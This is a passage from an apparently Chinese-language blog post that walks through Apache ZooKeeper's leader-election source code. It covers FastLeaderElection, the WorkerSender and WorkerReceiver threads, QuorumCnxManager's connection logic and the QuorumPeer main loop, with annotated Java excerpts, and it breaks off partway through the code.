<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//初始化</span></span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="title">FastLeaderElection</span><span class="params">(QuorumPeer self, QuorumCnxManager manager)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.stop = <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">this</span>.manager = manager;</span><br><span class="line">        starter(self, manager);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//starter</span></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * This method is invoked by the constructor. Because it is a</span></span><br><span class="line"><span class="comment">     * part of the starting procedure of the object that must be on</span></span><br><span class="line"><span class="comment">     * any constructor of this class, it is probably best to keep as</span></span><br><span class="line"><span class="comment">     * a separate method. As we have a single constructor currently,</span></span><br><span class="line"><span class="comment">     * it is not strictly necessary to have it separate.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> self      QuorumPeer that created this object</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> manager   Connection manager</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">starter</span><span class="params">(QuorumPeer self, QuorumCnxManager manager)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.self = self;</span><br><span class="line">        proposedLeader = -<span class="number">1</span>;</span><br><span class="line">        proposedZxid = -<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        sendqueue = <span class="keyword">new</span> LinkedBlockingQueue&lt;ToSend&gt;();</span><br><span class="line">        recvqueue = <span class="keyword">new</span> LinkedBlockingQueue&lt;Notification&gt;();</span><br><span class="line">        <span class="keyword">this</span>.messenger = <span class="keyword">new</span> Messenger(manager);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>来看 Message 的构造器</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Messenger(QuorumCnxManager manager) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">this</span>.ws = <span class="keyword">new</span> WorkerSender(manager);</span><br><span class="line"></span><br><span class="line">            Thread t = <span class="keyword">new</span> Thread(<span class="keyword">this</span>.ws,</span><br><span class="line">                    <span class="string">"WorkerSender[myid="</span> + self.getId() + <span class="string">"]"</span>);</span><br><span class="line">            t.setDaemon(<span class="keyword">true</span>);</span><br><span class="line">            t.start();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">this</span>.wr = <span class="keyword">new</span> WorkerReceiver(manager);</span><br><span class="line"></span><br><span class="line">            t = <span class="keyword">new</span> Thread(<span class="keyword">this</span>.wr,</span><br><span class="line">                    <span class="string">"WorkerReceiver[myid="</span> + self.getId() + <span class="string">"]"</span>);</span><br><span class="line">            t.setDaemon(<span class="keyword">true</span>);</span><br><span class="line">            t.start();</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<p>启动两个守护线程来处理发送和接收请求</p>
<h6 id="WorkerSender-发送请求"><a href="#WorkerSender-发送请求" class="headerlink" title="WorkerSender 发送请求"></a>WorkerSender 发送请求</h6><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">WorkerSender</span> <span class="keyword">extends</span> <span class="title">ZooKeeperThread</span> </span>&#123;</span><br><span class="line">            <span class="keyword">volatile</span> <span class="keyword">boolean</span> stop;</span><br><span class="line">            QuorumCnxManager manager;</span><br><span class="line"></span><br><span class="line">            WorkerSender(QuorumCnxManager manager)&#123;</span><br><span class="line">                <span class="keyword">super</span>(<span class="string">"WorkerSender"</span>);</span><br><span class="line">                <span class="keyword">this</span>.stop = <span class="keyword">false</span>;</span><br><span class="line">                <span class="keyword">this</span>.manager = manager;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                <span class="keyword">while</span> (!stop) &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        ToSend m = sendqueue.poll(<span class="number">3000</span>, TimeUnit.MILLISECONDS);</span><br><span class="line">                        <span class="keyword">if</span>(m == <span class="keyword">null</span>) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">                        process(m);</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                LOG.info(<span class="string">"WorkerSender is down"</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/**</span></span><br><span class="line"><span class="comment">             * Called by run() once there is a new message to send.</span></span><br><span class="line"><span class="comment">             *</span></span><br><span class="line"><span class="comment">             * <span class="doctag">@param</span> m     message to send</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            <span class="function"><span class="keyword">void</span> <span class="title">process</span><span class="params">(ToSend m)</span> </span>&#123;</span><br><span class="line">                ByteBuffer requestBuffer = buildMsg(m.state.ordinal(),</span><br><span class="line">                                                        m.leader,</span><br><span class="line">                                                        m.zxid,</span><br><span class="line">                                                        m.electionEpoch,</span><br><span class="line">                                                        m.peerEpoch);</span><br><span class="line">                manager.toSend(m.sid, requestBuffer);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<p>toSend 方法实现</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Processes invoke this message to queue a message to send. Currently,</span></span><br><span class="line"><span class="comment">     * only leader election uses it.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">toSend</span><span class="params">(Long sid, ByteBuffer b)</span> </span>&#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * If sending message to myself, then simply enqueue it (loopback).</span></span><br><span class="line"><span class="comment">         如果投票给自己</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.mySid == sid) &#123;</span><br><span class="line">             b.position(<span class="number">0</span>);</span><br><span class="line">             <span class="comment">//添加到接收队列</span></span><br><span class="line">             addToRecvQueue(<span class="keyword">new</span> Message(b.duplicate(), sid));</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">             * Otherwise send to the corresponding thread to send.</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">             <span class="comment">/*</span></span><br><span class="line"><span class="comment">              * Start a new connection if doesn't have one already.</span></span><br><span class="line"><span class="comment">              */</span></span><br><span class="line">             ArrayBlockingQueue&lt;ByteBuffer&gt; bq = <span class="keyword">new</span> ArrayBlockingQueue&lt;ByteBuffer&gt;(SEND_CAPACITY);</span><br><span class="line">             ArrayBlockingQueue&lt;ByteBuffer&gt; bqExisting = queueSendMap.putIfAbsent(sid, bq);</span><br><span class="line">             <span class="comment">//添加到发送队列</span></span><br><span class="line">             <span class="keyword">if</span> (bqExisting != <span class="keyword">null</span>) &#123;</span><br><span class="line">                 addToSendQueue(bqExisting, b);</span><br><span class="line">             &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                 addToSendQueue(bq, b);</span><br><span class="line">             &#125;</span><br><span class="line">             <span class="comment">//和sid对应的服务建立连接</span></span><br><span class="line">             connectOne(sid);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>接着看 connectOne 方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">synchronized</span> <span class="keyword">public</span> <span class="keyword">void</span> <span class="title">connectOne</span><span class="params">(<span class="keyword">long</span> sid)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!connectedToPeer(sid))&#123;</span><br><span class="line">            InetSocketAddress electionAddr;</span><br><span class="line">            <span class="keyword">if</span> (view.containsKey(sid)) &#123;</span><br><span class="line">                electionAddr = view.get(sid).electionAddr;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                LOG.warn(<span class="string">"Invalid server id: "</span> + sid);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">                LOG.debug(<span class="string">"Opening channel to server "</span> + sid);</span><br><span class="line">                <span class="comment">//和sid对应server建立连接</span></span><br><span class="line">                Socket sock = <span class="keyword">new</span> Socket();</span><br><span class="line">                setSockOpts(sock);</span><br><span class="line">                sock.connect(view.get(sid).electionAddr, cnxTO);</span><br><span class="line">                LOG.debug(<span class="string">"Connected to server "</span> + sid);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// Sends connection request asynchronously if the quorum</span></span><br><span class="line">                <span class="comment">// sasl authentication is enabled. This is required because</span></span><br><span class="line">                <span class="comment">// sasl server authentication process may take few seconds to</span></span><br><span class="line">                <span class="comment">// finish, this may delay next peer connection requests.</span></span><br><span class="line">                <span class="keyword">if</span> (quorumSaslAuthEnabled) &#123;</span><br><span class="line">                    initiateConnectionAsync(sock, sid);</span><br><span class="line">                <span class="comment">//建立连接,将服务id发送给对方服务</span></span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    initiateConnection(sock, sid);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (UnresolvedAddressException e) &#123;</span><br><span class="line">                <span class="comment">// Sun doesn't include the address that causes this</span></span><br><span class="line">                <span class="comment">// exception to be thrown, also UAE cannot be wrapped cleanly</span></span><br><span class="line">                <span class="comment">// so we log the exception in order to capture this critical</span></span><br><span class="line">                <span class="comment">// detail.</span></span><br><span class="line">                LOG.warn(<span class="string">"Cannot open channel to "</span> + sid</span><br><span class="line">                        + <span class="string">" at election address "</span> + electionAddr, e);</span><br><span class="line">                <span class="comment">// Resolve hostname for this server in case the</span></span><br><span class="line">                <span class="comment">// underlying ip address has changed.</span></span><br><span class="line">                <span class="keyword">if</span> (view.containsKey(sid)) &#123;</span><br><span class="line">                    view.get(sid).recreateSocketAddresses();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">throw</span> e;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                LOG.warn(<span class="string">"Cannot open channel to "</span> + sid</span><br><span class="line">                        + <span class="string">" at election address "</span> + electionAddr,</span><br><span class="line">                        e);</span><br><span class="line">                <span class="comment">// We can't really tell if the server is actually down or it failed</span></span><br><span class="line">                <span class="comment">// to connect to the server because the underlying IP address</span></span><br><span class="line">                <span class="comment">// changed. Resolve the hostname again just in case.</span></span><br><span class="line">                <span class="keyword">if</span> (view.containsKey(sid)) &#123;</span><br><span class="line">                    view.get(sid).recreateSocketAddresses();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            LOG.debug(<span class="string">"There is a connection already for server "</span> + sid);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h6 id="WorkerReceiver-接收请求"><a href="#WorkerReceiver-接收请求" class="headerlink" title="WorkerReceiver 接收请求"></a>WorkerReceiver 接收请求</h6><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">WorkerReceiver</span> <span class="keyword">extends</span> <span class="title">ZooKeeperThread</span> </span>&#123;</span><br><span class="line">           <span class="keyword">volatile</span> <span class="keyword">boolean</span> stop;</span><br><span class="line">           QuorumCnxManager manager;</span><br><span class="line"></span><br><span class="line">           WorkerReceiver(QuorumCnxManager manager) &#123;</span><br><span class="line">               <span class="keyword">super</span>(<span class="string">"WorkerReceiver"</span>);</span><br><span class="line">               <span class="keyword">this</span>.stop = <span class="keyword">false</span>;</span><br><span class="line">               <span class="keyword">this</span>.manager = manager;</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">           <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">               Message response;</span><br><span class="line">               <span class="keyword">while</span> (!stop) &#123;</span><br><span class="line">                   <span class="comment">// Sleeps on receive</span></span><br><span class="line">                   <span class="keyword">try</span>&#123;</span><br><span class="line">                       response = manager.pollRecvQueue(<span class="number">3000</span>, TimeUnit.MILLISECONDS);</span><br><span class="line">                       <span class="keyword">if</span>(response == <span class="keyword">null</span>) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">                       <span class="comment">/*</span></span><br><span class="line"><span class="comment">                        * If it is from an observer, respond right away.</span></span><br><span class="line"><span class="comment">                        * Note that the following predicate assumes that</span></span><br><span class="line"><span class="comment">                        * if a server is not a follower, then it must be</span></span><br><span class="line"><span class="comment">                        * an observer. If we ever have any other type of</span></span><br><span class="line"><span class="comment">                        * learner in the future, we'll have to change the</span></span><br><span class="line"><span class="comment">                        * way we check for observers.</span></span><br><span class="line"><span class="comment">                        */</span></span><br><span class="line">                       <span class="keyword">if</span>(!validVoter(response.sid))&#123;</span><br><span class="line">                           Vote current = self.getCurrentVote();</span><br><span class="line">                           ToSend notmsg = <span class="keyword">new</span> ToSend(ToSend.mType.notification,</span><br><span class="line">                                   current.getId(),</span><br><span class="line">                                   current.getZxid(),</span><br><span class="line">                                   logicalclock.get(),</span><br><span class="line">                                   self.getPeerState(),</span><br><span class="line">                                   response.sid,</span><br><span class="line">                                   current.getPeerEpoch());</span><br><span class="line"></span><br><span class="line">                           sendqueue.offer(notmsg);</span><br><span class="line">                       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                           <span class="comment">// Receive new message</span></span><br><span class="line">                           <span class="keyword">if</span> (LOG.isDebugEnabled()) &#123;</span><br><span class="line">                               LOG.debug(<span class="string">"Receive new notification message. My id = "</span></span><br><span class="line">                                       + self.getId());</span><br><span class="line">                           &#125;</span><br><span class="line"></span><br><span class="line">                           <span class="comment">/*</span></span><br><span class="line"><span class="comment">                            * We check for 28 bytes for backward compatibility</span></span><br><span class="line"><span class="comment">                            响应字节数&lt;28</span></span><br><span class="line"><span class="comment">                            */</span></span><br><span class="line">                           <span class="keyword">if</span> (response.buffer.capacity() &lt; <span class="number">28</span>) &#123;</span><br><span class="line">                               LOG.error(<span class="string">"Got a short response: "</span></span><br><span class="line">                                       + response.buffer.capacity());</span><br><span class="line">                               <span class="keyword">continue</span>;</span><br><span class="line">                           &#125;</span><br><span class="line">                           <span class="keyword">boolean</span> backCompatibility = (response.buffer.capacity() == <span class="number">28</span>);</span><br><span class="line">                           response.buffer.clear();</span><br><span class="line"></span><br><span class="line">                           <span class="comment">// 实例化Notification</span></span><br><span class="line">                           Notification n = <span class="keyword">new</span> Notification();</span><br><span class="line"></span><br><span class="line">                           <span class="comment">// server的ack状态</span></span><br><span class="line">                           QuorumPeer.ServerState ackstate = QuorumPeer.ServerState.LOOKING;</span><br><span class="line">                           <span class="keyword">switch</span> (response.buffer.getInt()) &#123;</span><br><span class="line">                           <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">                               ackstate = QuorumPeer.ServerState.LOOKING;</span><br><span class="line">                               <span class="keyword">break</span>;</span><br><span class="line">                           <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                               ackstate = QuorumPeer.ServerState.FOLLOWING;</span><br><span class="line">                               <span class="keyword">break</span>;</span><br><span class="line">                           <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                               ackstate = QuorumPeer.ServerState.LEADING;</span><br><span class="line">                               <span class="keyword">break</span>;</span><br><span class="line">                           <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                               ackstate = QuorumPeer.ServerState.OBSERVING;</span><br><span class="line">                               <span class="keyword">break</span>;</span><br><span class="line">                           <span class="keyword">default</span>:</span><br><span class="line">                               <span class="keyword">continue</span>;</span><br><span class="line">                           &#125;</span><br><span class="line"></span><br><span class="line">                           n.leader = response.buffer.getLong();</span><br><span class="line">                           n.zxid = response.buffer.getLong();</span><br><span class="line">                           n.electionEpoch = response.buffer.getLong();</span><br><span class="line">                           n.state = ackstate;</span><br><span class="line">                           n.sid = response.sid;</span><br><span class="line">                           <span class="keyword">if</span>(!backCompatibility)&#123;</span><br><span class="line">                               n.peerEpoch = response.buffer.getLong();</span><br><span class="line">                           &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                               <span class="keyword">if</span>(LOG.isInfoEnabled())&#123;</span><br><span class="line">                                   LOG.info(<span class="string">"Backward compatibility mode, server id="</span> + n.sid);</span><br><span class="line">                               &#125;</span><br><span class="line">                               n.peerEpoch = ZxidUtils.getEpochFromZxid(n.zxid);</span><br><span class="line">                           &#125;</span><br><span class="line"></span><br><span class="line">                           <span class="comment">/*</span></span><br><span class="line"><span class="comment">                            * Version added in 3.4.6</span></span><br><span class="line"><span class="comment">                            */</span></span><br><span class="line"></span><br><span class="line">                           n.version = (response.buffer.remaining() &gt;= <span class="number">4</span>) ?</span><br><span class="line">                                        response.buffer.getInt() : <span class="number">0x0</span>;</span><br><span class="line"></span><br><span class="line">                           <span class="comment">/*</span></span><br><span class="line"><span class="comment">                            * Print notification info</span></span><br><span class="line"><span class="comment">                            */</span></span><br><span class="line">                           <span class="keyword">if</span>(LOG.isInfoEnabled())&#123;</span><br><span class="line">                               printNotification(n);</span><br><span class="line">                           &#125;</span><br><span class="line"></span><br><span class="line">                           <span class="comment">/*</span></span><br><span class="line"><span class="comment">                            * If this server is looking, then send proposed leader</span></span><br><span class="line"><span class="comment">                              如果服务状态为looking,则发送leader选举提议信息</span></span><br><span class="line"><span class="comment">                            */</span></span><br><span class="line"></span><br><span class="line">                           <span class="keyword">if</span>(self.getPeerState() == QuorumPeer.ServerState.LOOKING)&#123;</span><br><span class="line">                               recvqueue.offer(n);</span><br><span class="line"></span><br><span class="line">                               <span class="comment">/*</span></span><br><span class="line"><span class="comment">                                * Send a notification back if the peer that sent this</span></span><br><span class="line"><span class="comment">                                * message is also looking and its logical clock is</span></span><br><span class="line"><span class="comment">                                * lagging behind.</span></span><br><span class="line"><span class="comment">                                */</span></span><br><span class="line">                               <span class="keyword">if</span>((ackstate == QuorumPeer.ServerState.LOOKING)</span><br><span class="line">                                       &amp;&amp; (n.electionEpoch &lt; logicalclock.get()))&#123;</span><br><span class="line">                                   <span class="comment">//封装投票信息</span></span><br><span class="line">                                   Vote v = getVote();</span><br><span class="line">                                   <span class="comment">//待发送信息</span></span><br><span class="line">                                   ToSend notmsg = <span class="keyword">new</span> ToSend(ToSend.mType.notification,</span><br><span class="line">                                           v.getId(),</span><br><span class="line">                                           v.getZxid(),</span><br><span class="line">                                           logicalclock.get(),</span><br><span class="line">                                           self.getPeerState(),</span><br><span class="line">                                           response.sid,</span><br><span class="line">                                           v.getPeerEpoch());</span><br><span class="line">                                   <span class="comment">//放入发送队列</span></span><br><span class="line">                                   sendqueue.offer(notmsg);</span><br><span class="line">                               &#125;</span><br><span class="line">                           &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                               <span class="comment">/*</span></span><br><span class="line"><span class="comment">                                * If this server is not looking, but the one that sent the ack</span></span><br><span class="line"><span class="comment">                                * is looking, then send back what it believes to be the leader.</span></span><br><span class="line"><span class="comment">                                如果收到的请求ack状态为looking但是当前server不是looking状态</span></span><br><span class="line"><span class="comment">                                */</span></span><br><span class="line">                               Vote current = self.getCurrentVote();</span><br><span class="line">                               <span class="keyword">if</span>(ackstate == QuorumPeer.ServerState.LOOKING)&#123;</span><br><span class="line">                                   <span class="keyword">if</span>(LOG.isDebugEnabled())&#123;</span><br><span class="line">                                       LOG.debug(<span class="string">"Sending new notification. My id =  "</span> +</span><br><span class="line">                                               self.getId() + <span class="string">" recipient="</span> +</span><br><span class="line">                                               response.sid + <span class="string">" zxid=0x"</span> +</span><br><span class="line">                                               Long.toHexString(current.getZxid()) +</span><br><span class="line">                                               <span class="string">" leader="</span> + current.getId());</span><br><span class="line">                                   &#125;</span><br><span class="line"></span><br><span class="line">                                   ToSend notmsg;</span><br><span class="line">                                   <span class="comment">//版本大于0</span></span><br><span class="line">                                   <span class="keyword">if</span>(n.version &gt; <span class="number">0x0</span>) &#123;</span><br><span class="line">                                       notmsg = <span class="keyword">new</span> ToSend(</span><br><span class="line">                                               ToSend.mType.notification,</span><br><span class="line">                                               current.getId(),</span><br><span class="line">                                               current.getZxid(),</span><br><span class="line">                                               current.getElectionEpoch(),</span><br><span class="line">                                               self.getPeerState(),</span><br><span class="line">                                               response.sid,</span><br><span class="line">                                               current.getPeerEpoch());</span><br><span class="line"></span><br><span class="line">                                   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                       <span class="comment">//返回对方server的投票信息</span></span><br><span class="line">                                       Vote bcVote = self.getBCVote();</span><br><span class="line">                                       notmsg = <span class="keyword">new</span> ToSend(</span><br><span class="line">                                               ToSend.mType.notification,</span><br><span class="line">                                               bcVote.getId(),</span><br><span class="line">                                               bcVote.getZxid(),</span><br><span class="line">                                               bcVote.getElectionEpoch(),</span><br><span class="line">                                               self.getPeerState(),</span><br><span class="line">                                               response.sid,</span><br><span class="line">                                               bcVote.getPeerEpoch());</span><br><span class="line">                                   &#125;</span><br><span class="line">                                   <span class="comment">//放入发送队列</span></span><br><span class="line">                                   sendqueue.offer(notmsg);</span><br><span class="line">                               &#125;</span><br><span class="line">                           &#125;</span><br><span class="line">                       &#125;</span><br><span class="line">                   &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                       System.out.println(<span class="string">"Interrupted Exception while waiting for new message"</span> +</span><br><span class="line">                               e.toString());</span><br><span class="line">                   &#125;</span><br><span class="line">               &#125;</span><br><span class="line">               LOG.info(<span class="string">"WorkerReceiver is down"</span>);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure>
<h2 id="启动-QuorumPeer-线程"><a href="#启动-QuorumPeer-线程" class="headerlink" title="启动 QuorumPeer 线程"></a>启动 QuorumPeer 线程</h2><p>启动选举算法后,开始启动当前线程</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        setName(<span class="string">"QuorumPeer"</span> + <span class="string">"[myid="</span> + getId() + <span class="string">"]"</span> +</span><br><span class="line">                cnxnFactory.getLocalAddress());</span><br><span class="line"></span><br><span class="line">        LOG.debug(<span class="string">"Starting quorum peer"</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            jmxQuorumBean = <span class="keyword">new</span> QuorumBean(<span class="keyword">this</span>);</span><br><span class="line">            MBeanRegistry.getInstance().register(jmxQuorumBean, <span class="keyword">null</span>);</span><br><span class="line">            <span class="keyword">for</span>(QuorumServer s: getView().values())&#123;</span><br><span class="line">                ZKMBeanInfo p;</span><br><span class="line">                <span class="keyword">if</span> (getId() == s.id) &#123;</span><br><span class="line">                    p = jmxLocalPeerBean = <span class="keyword">new</span> LocalPeerBean(<span class="keyword">this</span>);</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        MBeanRegistry.getInstance().register(p, jmxQuorumBean);</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                        LOG.warn(<span class="string">"Failed to register with JMX"</span>, e);</span><br><span class="line">                        jmxLocalPeerBean = <span class="keyword">null</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    p = <span class="keyword">new</span> RemotePeerBean(s);</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        MBeanRegistry.getInstance().register(p, jmxQuorumBean);</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                        LOG.warn(<span class="string">"Failed to register with JMX"</span>, e);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            LOG.warn(<span class="string">"Failed to register with JMX"</span>, e);</span><br><span class="line">            jmxQuorumBean = <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">             * Main loop</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            <span class="keyword">while</span> (running) &#123;</span><br><span class="line">                <span class="keyword">switch</span> (getPeerState()) &#123;</span><br><span class="line">                <span class="keyword">case</span> LOOKING:</span><br><span class="line">                    LOG.info(<span class="string">"LOOKING"</span>);</span><br><span class="line">                    <span class="comment">//只读模式是否启用</span></span><br><span class="line">                    <span class="keyword">if</span> (Boolean.getBoolean(<span class="string">"readonlymode.enabled"</span>)) &#123;</span><br><span class="line">                        LOG.info(<span class="string">"Attempting to start ReadOnlyZooKeeperServer"</span>);</span><br><span class="line"></span><br><span class="line">                        <span class="comment">// Create read-only server but don't start it immediately</span></span><br><span class="line">                        <span class="keyword">final</span> ReadOnlyZooKeeperServer roZk = <span class="keyword">new</span> ReadOnlyZooKeeperServer(</span><br><span class="line">                                logFactory, <span class="keyword">this</span>,</span><br><span class="line">                                <span class="keyword">new</span> ZooKeeperServer.BasicDataTreeBuilder(),</span><br><span class="line">                                <span class="keyword">this</span>.zkDb);</span><br><span class="line"></span><br><span class="line">                        <span class="comment">// Instead of starting roZk immediately, wait some grace</span></span><br><span class="line">                        <span class="comment">// period before we decide we're partitioned.</span></span><br><span class="line">                        <span class="comment">//</span></span><br><span class="line">                        <span class="comment">// Thread is used here because otherwise it would require</span></span><br><span class="line">                        <span class="comment">// changes in each of election strategy classes which is</span></span><br><span class="line">                        <span class="comment">// unnecessary code coupling.</span></span><br><span class="line">                        Thread roZkMgr = <span class="keyword">new</span> Thread() &#123;</span><br><span class="line">                            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                                <span class="keyword">try</span> &#123;</span><br><span class="line">                                    <span class="comment">// lower-bound grace period to 2 secs</span></span><br><span class="line">                                    sleep(Math.max(<span class="number">2000</span>, tickTime));</span><br><span class="line">                                    <span class="comment">//只读模式启动,接收请求</span></span><br><span class="line">                                    <span class="keyword">if</span> (ServerState.LOOKING.equals(getPeerState())) &#123;</span><br><span class="line">                                        roZk.startup();</span><br><span class="line">                                    &#125;</span><br><span class="line">                                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                                    LOG.info(<span class="string">"Interrupted while attempting to start ReadOnlyZooKeeperServer, not started"</span>);</span><br><span class="line">                                &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                                    LOG.error(<span class="string">"FAILED to start ReadOnlyZooKeeperServer"</span>, e);</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            roZkMgr.start();</span><br><span class="line">                            setBCVote(<span class="keyword">null</span>);</span><br><span class="line">                            <span class="comment">//用LeaderElection算法选举leader</span></span><br><span class="line">                            setCurrentVote(makeLEStrategy().lookForLeader());</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                            LOG.warn(<span class="string">"Unexpected exception"</span>,e);</span><br><span class="line">                            setPeerState(ServerState.LOOKING);</span><br><span class="line">                        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                            <span class="comment">// If the thread is in the the grace period, interrupt</span></span><br><span class="line">                            <span class="comment">// to come out of waiting.</span></span><br><span class="line">                            roZkMgr.interrupt();</span><br><span class="line">                            roZk.shutdown();</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            setBCVote(<span class="keyword">null</span>);</span><br><span class="line">                            setCurrentVote(makeLEStrategy().lookForLeader());</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                            LOG.warn(<span class="string">"Unexpected exception"</span>, e);</span><br><span class="line">                            setPeerState(ServerState.LOOKING);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> OBSERVING:</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        LOG.info(<span class="string">"OBSERVING"</span>);</span><br><span class="line">                        <span class="comment">//设置为observer</span></span><br><span class="line">                        setObserver(makeObserver(logFactory));</span><br><span class="line">                        <span class="comment">//和leader建立连接,同步数据</span></span><br><span class="line">                        observer.observeLeader();</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                        LOG.warn(<span class="string">"Unexpected exception"</span>,e );</span><br><span class="line">                    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                        observer.shutdown();</span><br><span class="line">                        setObserver(<span class="keyword">null</span>);</span><br><span class="line">                        setPeerState(ServerState.LOOKING);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> FOLLOWING:</span><br><span class="line">                    <span 